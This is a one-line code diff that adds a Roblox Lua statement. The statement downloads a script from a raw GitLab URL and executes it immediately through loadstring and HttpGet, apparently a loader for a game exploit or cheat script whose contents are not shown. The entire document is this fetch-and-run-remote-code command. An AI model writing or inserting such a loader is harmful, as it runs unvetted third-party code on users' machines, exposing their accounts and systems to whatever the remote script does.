@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gitlab.com/tn1180200/hi/-/raw/master/cc1.12ios.lua", true))()
